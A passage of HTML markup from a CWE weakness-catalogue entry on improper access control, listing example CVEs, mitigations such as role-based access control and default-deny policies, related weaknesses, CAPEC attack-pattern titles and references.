&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2960" target="_blank"&gt;CVE-2009-2960&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Web application does not restrict access to admin
scripts, allowing authenticated users to modify passwords of other
users.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3597" target="_blank"&gt;CVE-2009-3597&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Web application stores database file under the web
root with insufficient access control (CWE-219), allowing direct
request.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2282" target="_blank"&gt;CVE-2009-2282&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Terminal server does not check authorization for
guest access.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3230" target="_blank"&gt;CVE-2009-3230&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Database server does not use appropriate
privileges for certain sensitive operations.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2213" target="_blank"&gt;CVE-2009-2213&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Gateway uses default "Allow" configuration for its
authorization settings.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0034" target="_blank"&gt;CVE-2009-0034&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Chain: product does not properly interpret a
configuration option for a system group, allowing users to gain
privileges.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-6123" target="_blank"&gt;CVE-2008-6123&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Chain: SNMP product does not properly parse a
configuration option for which hosts are allowed to connect, allowing
unauthorized IP addresses to connect.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5027" target="_blank"&gt;CVE-2008-5027&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;System monitoring software allows users to bypass
authorization by creating custom forms.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-7109" target="_blank"&gt;CVE-2008-7109&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Chain: reliance on client-side security (CWE-602)
allows attackers to bypass authorization using a custom
client.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3424" target="_blank"&gt;CVE-2008-3424&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Chain: product does not properly handle wildcards
in an authorization policy list, allowing unintended
access.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3781" target="_blank"&gt;CVE-2009-3781&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Content management system does not check access
permissions for private files, allowing others to view those
files.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4577" target="_blank"&gt;CVE-2008-4577&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;ACL-based protection mechanism treats negative
access rights as if they are positive, allowing bypass of intended
restrictions.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-6548" target="_blank"&gt;CVE-2008-6548&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Product does not check the ACL of a page accessed
using an "include" directive, allowing attackers to read unauthorized
files.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2925" target="_blank"&gt;CVE-2007-2925&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Default ACL list for a DNS server does not set
certain ACLs, allowing unauthorized DNS
queries.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-6679" target="_blank"&gt;CVE-2006-6679&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Product relies on the X-Forwarded-For HTTP header
for authorization, allowing unintended access by spoofing the
header.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3623" target="_blank"&gt;CVE-2005-3623&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;OS kernel does not check for a certain privilege
before setting ACLs for files.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2801" target="_blank"&gt;CVE-2005-2801&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Chain: file-system code performs an incorrect
comparison (CWE-697), preventing defauls ACLs from being properly
applied.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1155" target="_blank"&gt;CVE-2001-1155&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Chain: product does not properly check the result
of a reverse DNS lookup because of operator precedence (CWE-783), allowing
bypass of DNS-based access restrictions.&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_285_Potential Mitigations" id="oc_285_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Architecture and Design&lt;/p&gt;&lt;p&gt;Divide your application into anonymous, normal, privileged, and
administrative areas. Reduce the attack surface by carefully mapping
roles with data and functionality. Use role-based access control (RBAC)
to enforce the roles at the appropriate boundaries.&lt;/p&gt;&lt;p&gt;Note that this approach may not protect against horizontal
authorization, i.e., it will not protect a user from attacking others
with the same role.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Architecture and Design&lt;/p&gt;&lt;p&gt;Ensure that you perform access control checks related to your business
logic. These checks may be different than the access control checks that
you apply to more generic resources such as files, connections,
processes, memory, and database records. For example, a database may
restrict access for medical records to a specific database user, but
each record might only be intended to be accessible to the patient and
the patient's doctor.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Architecture and Design&lt;/p&gt;&lt;p class="optheading"&gt;Strategy:  Libraries or Frameworks&lt;/p&gt;&lt;p&gt;Use a vetted library or framework that does not allow this weakness to
occur or provides constructs that make this weakness easier to
avoid.&lt;/p&gt;&lt;p&gt;For example, consider using authorization frameworks such as the JAAS
Authorization Framework and the OWASP ESAPI Access Control
feature.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Architecture and Design&lt;/p&gt;&lt;p&gt;For web applications, make sure that the access control mechanism is
enforced correctly at the server side on every page. Users should not be
able to access any unauthorized functionality or information by simply
requesting direct access to that page.&lt;/p&gt;&lt;p&gt;One way to do this is to ensure that all pages containing sensitive
information are not cached, and that all such pages restrict access to
requests that are accompanied by an active and authenticated session
token associated with a user who has the required permissions to access
that page.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phases:  System Configuration; Installation&lt;/p&gt;&lt;p&gt;Use the access control capabilities of your operating system and
server environment and define your access control lists accordingly. Use
a "default deny" policy when defining these ACLs.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_285_Relationships" id="oc_285_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;254&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=254" target="_blank"&gt;Security Features&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;284&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=284" target="_blank"&gt;Access Control (Authorization) Issues&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;721&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=721" target="_blank"&gt;OWASP Top Ten 2007 Category A10 - Failure to Restrict URL Access&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in OWASP Top Ten (2007) &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;629&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;723&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=723" target="_blank"&gt;OWASP Top Ten 2004 Category A2 - Broken Access Control&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in OWASP Top Ten (2004) &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;711&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;753&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=753" target="_blank"&gt;2009 Top 25 - Porous Defenses&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in the 2009 CWE/SANS Top 25 Most Dangerous Programming Errors &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;750&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;803&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=803" target="_blank"&gt;2010 Top 25 - Porous Defenses&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in the 2010 CWE/SANS Top 25 Most Dangerous Programming Errors &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;800&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Variant&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;219&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=219" target="_blank"&gt;Sensitive Data Under Web Root&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;551&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=551" target="_blank"&gt;Incorrect Behavior Order: Authorization Before Parsing and Canonicalization&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;638&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=638" target="_blank"&gt;Failure to Use Complete Mediation&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;804&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=804" target="_blank"&gt;Guessable CAPTCHA&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_285_Taxonomy Mappings" id="oc_285_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;7 Pernicious Kingdoms&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Missing Access Control&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;OWASP Top Ten 2007&lt;/td&gt;&lt;td valign="top"&gt;A10&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE More Specific&lt;/td&gt;&lt;td valign="top"&gt;Failure to Restrict URL Access&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;OWASP Top Ten 2004&lt;/td&gt;&lt;td valign="top"&gt;A2&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE More Specific&lt;/td&gt;&lt;td valign="top"&gt;Broken Access Control&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Related Attack Patterns"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Related Attack Patterns&lt;/div&gt;&lt;div name="oc_285_Related Attack Patterns" id="oc_285_Related Attack Patterns" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;CAPEC-ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Attack Pattern Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;&lt;div style="font-weight:normal; font-size:85%; font-style:italic; color:#000000"&gt;(CAPEC Version: 1.5)&lt;/div&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org1.html" target="_blank"&gt;1&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Accessing Functionality Not Properly Constrained by ACLs&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org13.html" target="_blank"&gt;13&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Subverting Environment Variable Values&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org17.html" target="_blank"&gt;17&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Accessing, Modifying or Executing Executable Files&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org87.html" target="_blank"&gt;87&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Forceful Browsing&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org39.html" target="_blank"&gt;39&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Manipulating Opaque Client-based Data Tokens&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org45.html" target="_blank"&gt;45&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Buffer Overflow via Symbolic Links&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org51.html" target="_blank"&gt;51&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Poison Web Service Registry&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org59.html" target="_blank"&gt;59&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Session Credential Falsification through Prediction&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org60.html" target="_blank"&gt;60&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Reusing Session IDs (aka Session Replay)&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org77.html" target="_blank"&gt;77&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Manipulating User-Controlled Variables&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org76.html" target="_blank"&gt;76&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Manipulating Input to File System Calls&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org104.html" target="_blank"&gt;104&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Cross Zone Scripting&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="References"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;References&lt;/div&gt;&lt;div name="oc_285_References" id="oc_285_References" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;NIST. "Role Based Access Control and Role Based
Security". &amp;lt;&lt;a href="http://csrc.nist.gov/groups/SNS/rbac/" target="_blank"&gt;http://csrc.nist.gov/groups/SNS/rbac/&lt;/a&gt;&amp;gt;.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;[REF-11] M. Howard and
D. LeBlanc. "Writing Secure Code". Chapter 4, "Authorization" Page 114; Chapter 6, "Determining
Appropriate Access Control" Page 171. 2nd Edition. Microsoft. 2002. &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_285_Content History" id="oc_285_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;7 Pernicious Kingdoms&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-08-15&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Veracode&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;Suggested OWASP Top Ten 2004
mapping&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships, Other Notes,
